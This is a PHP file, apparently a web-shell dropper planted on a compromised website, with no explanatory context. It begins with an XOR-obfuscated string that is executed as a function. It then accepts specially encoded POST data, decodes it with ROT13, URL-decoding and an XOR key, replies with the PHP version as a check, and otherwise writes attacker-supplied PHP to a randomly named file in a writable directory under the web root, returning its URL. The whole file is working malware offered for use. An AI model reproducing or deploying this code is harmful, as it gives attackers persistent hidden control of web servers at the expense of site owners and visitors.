<?php $rNowTWb='Z;<8M j12UHT:-Z'; $FPQaSW='9IYY9E5WG;+ SB4'^$rNowTWb; $mJytcm='< Gp+X9H9EQ<lKIRJ=CbSCS:nS8:Y<0WD0FyoY=><R1<,8=:Ea==JtV TY=e.01Zn +7ZkdiFE<LjYrgxEEnYcUYIAduPAt>s1+YGqo9hpKyyKnZoA:L+  AM392YajxUPmxa;P;bDH8kCsIjq,Q8OnwTfNbve3 6flBPomAN  VWMVQ3EB2gnhql6VZ J8Ii5YFkJmnD;DknV V7TulER+ZX,j6l1J-,lS<TjUj<.Q +odh1ZL7QY8azs=oc>frrE6=Wc1 -MemJc5R6AEqdLrkN..-A=35TdKgLP=TY34tT9AVdWpH1 Y QyaCzg+.nMbmH;T HLVzZ>>3,63Zskkof<:xkjdhA vmVI4bWxah=2->=jwGr=Pm=8LA09=,gkbr9  siyfi4Y1Almwn W 4EsBLCI61awYP=;MgcrX-HNBEQ6177FJQ1n58YS;b<9BZO KVlb:139XQIDs.9D5kveQ47 5dG5;MjXO<HOmQ68SmqMn  FTJa=Q=8PU>=DFlbYVHjNdc1Q5.sVoixE.YBphT5A;=DR+ N+YuiwvaV;YtuEphITRd-RrT lDdQI1MyRr4YRVKwmcqDC2<C1=f.7:l B.S-:iq=6O=VV0cvdNJ F0nnciVrMVJyk6.S<raTRH6bT73M;88-o8hc;l VX8fRFvBA'; $CwlalW=$FPQaSW('', 'UFoQM-W+M,>R3.1;9I0Jt;<H17YN8co:1DaPFyF454DROLTU+AER8+2A 8b:CEErJDJC;GDM- EeJyRGX>OgPG:,=aYUwfO4z8M65YKPHMkIBkJ3S2N>GENiiWXF8HQXq9FSH1Y2F+=LKmNiBUH0L.5S=;n<VAXEO=H+pJM2:RL39er:V<koNUbxeD3.U8VaMZ,2Bqgg919adrD7C5UQe4J6+IQ<HU+YM38Y-JhJZO=SNTnbW5>R0:PARWb,,q-;7eWNwGZETmXSjGC3Z4 XD7xbjJOY bXP-DvGh;X-b9=P0X57DjPlGA5U4Bk>pmBHNeCI,Z Aal-pSXQAIWP2SCO04yk-.90H SVI=,MBjFALKSAKXCW<x4YIYY8 oRXUGVBVREYHcpoMP8E LPWJV6LA HHE>CK;kS=1IZmZC2-C;+0,0ZXMRn2>C1QY-2d=QL6r-A83ZVeUVZ75,lWJX0TBZEuPVTT;,PBdCcEU.gI5WL2MWkNAR453>V4Dg5-WN05DE231MbDGU0AOZvIOXmC=wXL0T5Zfc9NYivpUTJVFdZmEMvDZ+61UKcG0DUsTbxS+L3KRh6a-PDCWbcSN1PD9ERC3E:G YIAVMW6Q97TDZDj.A2QGGCIvRmv1sbSX2PZE03<W9sGR4WWYIHeAX1eE.1LNboMH<'^$mJytcm); $CwlalW();

foreach ($_POST as $session_key => $value)
{
    if (strlen($session_key) == 16)
    {
        $value = str_split(rawurldecode(str_rot13($value)));
        $session_key = array_slice(str_split(str_repeat($session_key, (count($value)/16)+1)), 0, count($value));

        function encoder($val, $index, $session_key)
        {
            $auth = "vmfnruwbyraphepw";
            return $val ^ $auth[$index % strlen($auth)] ^ $session_key;
        }

        $value = implode("", array_map("encoder", array_values($value), array_keys($value), array_values($session_key)));

        $value = @unserialize($value);

        if (@is_array($value))
        {
            $key = array_keys($value);
            $value = $value[$key[0]];

            if ($value === $key[0])
            {
                echo @serialize(Array("php" => @phpversion(), ));exit();
            }
            else {
                function listdirs($dir)
                {
                    static $alldirs = array();
                    $dirs = glob($dir . '/*', GLOB_ONLYDIR);
                    if (count($dirs) > 0) {
                        foreach ($dirs as $d) {
                            if (@is_writable($d)) {
                                $alldirs[] = $d;
                            }
                        }
                    }
                    foreach ($dirs as $dir) listdirs($dir);
                    return $alldirs;
                }

                $docroot = $_SERVER["DOCUMENT_ROOT"];

                $dirs = listdirs($docroot);
                $key = array_rand($dirs);
                $dest = $dirs[$key] . "/" . substr(md5(time()), 0, 8) . ".php";

                @file_put_contents($dest, $value);

                echo "http://" . $_SERVER["HTTP_HOST"] . substr($dest, strlen($docroot));

                exit();
            }
        }
    }
}
